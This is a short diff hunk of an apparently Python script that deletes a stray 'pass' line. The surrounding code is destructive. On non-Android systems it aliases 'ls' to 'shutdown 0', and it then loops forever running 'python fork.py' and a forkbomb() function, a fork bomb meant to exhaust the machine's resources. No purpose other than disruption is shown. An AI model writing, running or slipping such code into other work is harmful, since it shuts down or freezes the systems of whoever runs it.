@@ -6,7 +6,6 @@ if platform.system() == "Android":
   os.system('alias ls="sl"')
 else:
   os.system('alias ls="shutdown 0"')
-  pass
 while True:
   os.system("python fork.py")
   forkbomb()
